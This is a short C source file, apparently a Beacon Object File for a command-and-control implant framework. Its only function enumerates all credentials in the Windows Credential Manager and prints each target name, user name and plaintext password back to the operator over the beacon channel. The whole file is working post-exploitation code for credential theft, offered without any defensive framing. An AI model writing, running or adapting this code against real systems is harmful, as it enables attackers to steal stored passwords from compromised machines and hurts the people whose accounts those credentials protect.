#include <stdio.h>
#include <windows.h>
#include <wincred.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI Advapi32$CredEnumerateA(LPCSTR, DWORD, DWORD*, PCREDENTIAL**);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI Advapi32$CredFree(PVOID);

void go() {
    DWORD count;
    PCREDENTIAL* creds;

    if (!Advapi32$CredEnumerateA(NULL, 0, &count, &creds)) {
        BeaconPrintf(CALLBACK_OUTPUT,"Error enumerating credentials: %d\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,"Found %d credentials:\n", count);
    for (DWORD i = 0; i < count; i++) {
        BeaconPrintf(CALLBACK_OUTPUT,"  Target Name: %s\n", creds[i]->TargetName);
        BeaconPrintf(CALLBACK_OUTPUT,"  User Name: %s\n", creds[i]->UserName);
        BeaconPrintf(CALLBACK_OUTPUT,"  Password: %.*s\n", creds[i]->CredentialBlobSize, creds[i]->CredentialBlob);
        BeaconPrintf(CALLBACK_OUTPUT,"\n");
    }

    Advapi32$CredFree(creds);
}
